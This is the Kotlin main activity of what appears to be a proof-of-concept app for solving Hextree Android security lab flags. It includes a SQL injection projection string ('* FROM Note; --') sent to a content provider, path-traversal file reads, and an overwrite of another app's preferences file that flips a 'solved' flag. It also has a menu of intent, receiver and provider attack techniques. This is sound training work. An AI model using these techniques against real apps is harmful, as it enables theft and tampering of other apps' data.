package com.vishal2376.hextreepoc

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import com.vishal2376.hextreepoc.Utils.dumpCursor
import com.vishal2376.hextreepoc.ui.theme.HextreePoCTheme

class HextreeActivity : ComponentActivity() {
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)
		enableEdgeToEdge()

		// Register all dynamic broadcast receivers
		DynamicReceivers.registerAll(this)

		// Observe incoming intents
		Utils.showDialog(this, intent)

		setContent {
			HextreePoCTheme {
				MainScreen(this)
			}
		}
	}

	/**
	 * Result Handler — Intercepts data returned by target activities
	 * Technique: onActivityResult Data Capture
	 * Called automatically when target activity calls setResult() + finish().
	 * requestCode matches what we passed in startActivityForResult() to identify which flag.
	 * data contains the intent with flag/sensitive info sent back by target activity.
	 * We display the returned intent extras using Utils.showDialog() to reveal the flag.
	 */
	override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
		super.onActivityResult(requestCode, resultCode, data)

		// Flag8 result — display returned intent data
		if (requestCode == 8) {
			Utils.showDialog(this, data)
		}

		// Flag9 result — capture and display stolen flag from setResult()
		if (requestCode == 9) {
			Utils.showDialog(this, data)
		}

		// Flag33_1 result — capture and display stolen flag from setResult()
		if (requestCode == 331) {
			Utils.showDialog(this, data)

			dumpCursor(
				context = this,
				uri = data?.data.toString(),
				projection = arrayOf("* FROM Note; --"),
				title = "Flag 33_1"
			)
		}

		// Flag 34 - read the flag content from the granted file URI
		if (requestCode == 34) {
			Utils.readFileFromUri(this, data!!.data)
		}

		// Flag 35 - path traversal read: "../flag35.txt" escapes the intended folder
		if (requestCode == 35) {
			Utils.readFileFromUri(this, data!!.data)
		}

		// Flag 36 - path traversal WRITE: overwrite Flag36Preferences.xml via Flag35's write grant to flip solved=true
		if (requestCode == 36) {
			val newContent = """
	            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
                <map>
                    <boolean name="solved" value="true" />
                </map>
            """.trimIndent()
			Utils.writeFileToUri(this, data?.data, newContent)
			Utils.readFileFromUri(this, data?.data)
		}

		// Flag 37 - confirm what Flag37Activity actually queried from our provider
		if (requestCode == 37) {
			dumpCursor(this, data?.data.toString(), title = "Flag 37")
		}
	}

	override fun onNewIntent(intent: Intent?) {
		super.onNewIntent(intent)

		// Receives flag data sent back by Flag22 via pendingIntent.send()
		if (intent?.action == "FLAG22_RESULT") {
			val flag = intent.getStringExtra("flag")
			Log.d("@@@", "Flag22 : $flag")
			Utils.showDialog(this, intent)
		}
	}

	override fun onDestroy() {
		DynamicReceivers.unregisterAll(this)
		super.onDestroy()
	}
}

data class Flag(val name: String, val action: () -> Unit)

@Composable
fun MainScreen(activity: HextreeActivity) {
	val context = LocalContext.current
	val attack by remember { mutableStateOf(Attack(context, activity)) }

	val flags = remember(attack) {
		listOf(
			Flag("Flag 1 - Basic Activity") { attack.flag1() },
			Flag("Flag 2 - Intent with Extras") { attack.flag2() },
			Flag("Flag 3 - Data URI") { attack.flag3() },
			Flag("Flag 4 - State Machine") { attack.flag4() },
			Flag("Flag 5 - Intent in intent") { attack.flag5() },
			Flag("Flag 6 - Not Exported") { attack.flag6() },
			Flag("Flag 7 - Activity Lifecycle") { attack.flag7() },
			Flag("Flag 8 - Activity Result") { attack.flag8() },
			Flag("Flag 9 - Activity Result Flag") { attack.flag9() },
			Flag("Flag 12 - Implicit Intent") { attack.flag12() },
			Flag("Flag 16 - Basic Exposed Receiver") { attack.flag16() },
			Flag("Flag 17 - Receiver with Response") { attack.flag17() },
			Flag("Flag 22 - Pending Intent") { attack.flag22() },
			Flag("Flag 30 - Content Provider Query") { attack.flag30() },
			Flag("Flag 31 - Provider URI Matching") { attack.flag31() },
			Flag("Flag 32 - SQL Injection Query") { attack.flag32() },
			Flag("Flag 33_1 - Return Provider Access") { attack.flag33A1() },
			Flag("Flag 34 - Simple File provider") { attack.flag34() },
			Flag("Flag 35 - Root File provider") { attack.flag35() },
			Flag("Flag 36 - Overwriting Internal File") { attack.flag36() },
			Flag("Flag 37 - File Traversal") { attack.flag37() },
		)
	}

	Scaffold(
		modifier = Modifier.fillMaxSize()
	) { innerPadding ->
		LazyColumn(
			modifier = Modifier
				.fillMaxSize()
				.background(Color.Black)
				.padding(innerPadding),
			horizontalAlignment = Alignment.CenterHorizontally,
			verticalArrangement = Arrangement.spacedBy(16.dp, Alignment.CenterVertically)
		) {
			items(flags) { flag ->
				Button(onClick = flag.action) {
					Text(flag.name)
				}
			}
		}
	}
}